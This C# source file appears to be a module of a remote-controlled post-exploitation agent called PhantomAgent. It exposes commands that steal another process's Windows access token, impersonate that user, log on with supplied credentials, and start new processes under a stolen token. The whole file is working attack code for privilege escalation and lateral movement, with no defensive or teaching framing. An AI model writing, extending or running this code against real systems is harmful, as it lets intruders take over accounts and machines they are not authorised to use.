using System.Runtime.InteropServices;
using System.Text.Json;

namespace PhantomAgent.Modules;

public static class TokenManip
{
    public const string Name = "token";

    public static Dictionary<string, Func<Dictionary<string, JsonElement>?, object>> GetCommands()
    {
        return new Dictionary<string, Func<Dictionary<string, JsonElement>?, object>>
        {
            ["steal_token"] = args => StealToken(GetInt(args, "pid")),
            ["make_token"] = args => MakeToken(
                GetString(args, "username"),
                GetString(args, "password"),
                GetStringOpt(args, "domain") ?? "."),
            ["rev2self"] = _ => Rev2Self(),
        };
    }

    private static Dictionary<string, object> StealToken(int pid)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        IntPtr hProcess = NativeMethods.OpenProcess(0x0400, false, pid); // PROCESS_QUERY_INFORMATION
        if (hProcess == IntPtr.Zero)
            throw new UnauthorizedAccessException($"OpenProcess failed for PID {pid}: {Marshal.GetLastWin32Error()}");

        try
        {
            if (!NativeMethods.OpenProcessToken(hProcess, 0x0002 | 0x0008, out IntPtr hToken)) // TOKEN_DUPLICATE | TOKEN_QUERY
                throw new UnauthorizedAccessException($"OpenProcessToken failed: {Marshal.GetLastWin32Error()}");

            try
            {
                // SecurityImpersonation=2, TokenImpersonation=2
                if (!NativeMethods.DuplicateTokenEx(hToken, 0x02000000, IntPtr.Zero, 2, 2, out IntPtr hDupToken))
                    throw new InvalidOperationException($"DuplicateTokenEx failed: {Marshal.GetLastWin32Error()}");

                try
                {
                    if (!NativeMethods.ImpersonateLoggedOnUser(hDupToken))
                        throw new InvalidOperationException($"ImpersonateLoggedOnUser failed: {Marshal.GetLastWin32Error()}");

                    return new Dictionary<string, object>
                    {
                        ["status"] = "ok",
                        ["impersonating"] = Environment.UserName,
                        ["pid"] = pid,
                    };
                }
                finally { NativeMethods.CloseHandle(hDupToken); }
            }
            finally { NativeMethods.CloseHandle(hToken); }
        }
        finally { NativeMethods.CloseHandle(hProcess); }
    }

    private static Dictionary<string, object> MakeToken(string username, string password, string domain)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        // LOGON32_LOGON_NEW_CREDENTIALS=9, LOGON32_PROVIDER_WINNT50=3
        if (!NativeMethods.LogonUser(username, domain, password, 9, 3, out IntPtr hToken))
            throw new UnauthorizedAccessException($"LogonUser failed: {Marshal.GetLastWin32Error()}");

        try
        {
            if (!NativeMethods.ImpersonateLoggedOnUser(hToken))
                throw new InvalidOperationException($"ImpersonateLoggedOnUser failed: {Marshal.GetLastWin32Error()}");

            return new Dictionary<string, object>
            {
                ["status"] = "ok",
                ["impersonating"] = $"{domain}\\{username}",
            };
        }
        finally { NativeMethods.CloseHandle(hToken); }
    }

    private static Dictionary<string, object> Rev2Self()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        if (!NativeMethods.RevertToSelf())
            throw new InvalidOperationException($"RevertToSelf failed: {Marshal.GetLastWin32Error()}");

        return new Dictionary<string, object>
        {
            ["status"] = "ok",
            ["username"] = Environment.UserName,
        };
    }

    // P/Invoke: CreateProcessWithTokenW for spawning a process under a stolen token
    public static Dictionary<string, object> CreateProcessWithToken(int pid, string commandLine)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        IntPtr hProcess = NativeMethods.OpenProcess(0x0400, false, pid);
        if (hProcess == IntPtr.Zero)
            throw new UnauthorizedAccessException($"OpenProcess failed: {Marshal.GetLastWin32Error()}");

        try
        {
            if (!NativeMethods.OpenProcessToken(hProcess, 0x0002, out IntPtr hToken))
                throw new UnauthorizedAccessException($"OpenProcessToken failed: {Marshal.GetLastWin32Error()}");

            try
            {
                if (!NativeMethods.DuplicateTokenEx(hToken, 0x02000000, IntPtr.Zero, 2, 1, out IntPtr hDupToken))
                    throw new InvalidOperationException($"DuplicateTokenEx failed: {Marshal.GetLastWin32Error()}");

                try
                {
                    var si = new NativeMethods.STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);

                    // LOGON_WITH_PROFILE=1
                    if (!NativeMethods.CreateProcessWithTokenW(hDupToken, 1, null, commandLine,
                            0x00000010, IntPtr.Zero, null, ref si, out var pi)) // CREATE_NEW_CONSOLE
                        throw new InvalidOperationException($"CreateProcessWithTokenW failed: {Marshal.GetLastWin32Error()}");

                    NativeMethods.CloseHandle(pi.hProcess);
                    NativeMethods.CloseHandle(pi.hThread);

                    return new Dictionary<string, object>
                    {
                        ["status"] = "ok",
                        ["new_pid"] = pi.dwProcessId,
                        ["command"] = commandLine,
                    };
                }
                finally { NativeMethods.CloseHandle(hDupToken); }
            }
            finally { NativeMethods.CloseHandle(hToken); }
        }
        finally { NativeMethods.CloseHandle(hProcess); }
    }

    private static int GetInt(Dictionary<string, JsonElement>? args, string key)
    {
        if (args == null || !args.TryGetValue(key, out var val))
            throw new ArgumentException($"Missing required argument: {key}");
        return val.GetInt32();
    }

    private static string GetString(Dictionary<string, JsonElement>? args, string key)
    {
        if (args == null || !args.TryGetValue(key, out var val))
            throw new ArgumentException($"Missing required argument: {key}");
        return val.GetString() ?? throw new ArgumentException($"Null value for: {key}");
    }

    private static string? GetStringOpt(Dictionary<string, JsonElement>? args, string key)
    {
        if (args == null || !args.TryGetValue(key, out var val)) return null;
        return val.GetString();
    }

    private static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int access, bool inherit, int pid);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr handle);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr hProcess, int access, out IntPtr hToken);

        // dwDesiredAccess, lpTokenAttributes, impersonationLevel (SECURITY_IMPERSONATION_LEVEL), tokenType (TOKEN_TYPE), phNewToken
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DuplicateTokenEx(IntPtr hToken, int access,
            IntPtr lpTokenAttributes, int impersonationLevel, int tokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool RevertToSelf();

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LogonUser(string user, string domain, string password,
            int logonType, int logonProvider, out IntPtr token);

        // dwLogonFlags, lpApplicationName, lpCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags,
            string? lpApplicationName, string lpCommandLine, int dwCreationFlags,
            IntPtr lpEnvironment, string? lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public int cb;
            public string? lpReserved;
            public string? lpDesktop;
            public string? lpTitle;
            public int dwX, dwY, dwXSize, dwYSize;
            public int dwXCountChars, dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
    }
}
